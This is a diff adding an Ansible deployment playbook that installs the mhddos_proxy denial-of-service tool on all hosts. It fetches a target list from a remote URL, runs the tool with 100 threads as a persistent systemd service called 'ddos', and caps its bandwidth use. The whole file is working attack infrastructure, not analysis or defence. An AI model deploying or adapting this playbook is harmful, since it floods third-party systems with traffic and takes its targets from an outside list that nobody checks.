@@ -1,0 +1,94 @@
+- name: Deploy
+  hosts: all
+  handlers:
+    - name: reload systemctl
+      ansible.builtin.systemd:
+        daemon_reload: yes
+      become: true
+    - name: restart ddos
+      ansible.builtin.service:
+        name: ddos
+        state: restarted
+      become: true
+  vars:
+    home: "{{ lookup('env', 'HOME') }}"
+    logs: "{{ home }}/log"
+    dd_url: "https://github.com/porthole-ascend-cinnamon/mhddos_proxy"
+    dd_local: "{{ home }}/src/mhddos_proxy"
+    dd_config: "https://targets.cyberarmy.com.ua/targets.txt"
+    dd_threads: 100
+    dd_cmd: python3 ./runner.py 
+    dd_log: "{{ logs }}/mhddos.log"
+    iface: eth0
+    ddos: "{{ home }}/bin/ddos"
+    ddos_log: "{{ logs }}/ddos.log"
+    ddos_limit: 900G # see numfmt
+    ddos_sleep: 1h
+
+  tasks:
+    - name: Install packages
+      apt:
+        pkg:
+          - zsh
+          - vim
+          - git
+          - ca-certificates
+          - vnstat
+          - coreutils
+          - mailutils
+          - python3
+          - python3-pip
+          - wondershaper
+          - wget
+          - diffutils
+          - logrotate
+        install_recommends: no
+      become: yes
+
+    - name: create directories
+      ansible.builtin.file:
+        path: "{{ home }}/{{ item }}"
+        state: directory
+        mode: '0755'
+      loop:
+        - bin
+        - src
+        - log
+        - src/mhddos_proxy
+
+    - name: vnstat running
+      ansible.builtin.service:
+        name: vnstat
+        state: started
+      become: yes
+
+    - name: ddos sources clone/pull
+      ansible.builtin.git:
+        repo: "{{ dd_url }}"
+        dest: "{{ dd_local }}"
+        update: no
+      register: ddos_sources
+
+    - name: ddos requirements
+      ansible.builtin.shell: pip3 install -r requirements.txt
+      args:
+        chdir: "{{ dd_local }}"
+      when: ddos_sources.changed
+      #become: yes
+      notify: restart ddos
+    
+    - name: ddos wrapper
+      template: src=ddos.j2 dest="{{ ddos }}" mode=750
+      notify: restart ddos
+
+    - name: ddos service conf
+      template: src=ddos.service.j2 dest=/etc/systemd/system/ddos.service mode=644
+      notify:
+        - reload systemctl
+        - restart ddos
+      become: yes
+
+    - name: logrotate conf
+      template: src=logrotate.j2 dest="/etc/logrotate.d/{{ ansible_user }}" mode=644
+      become: yes
+
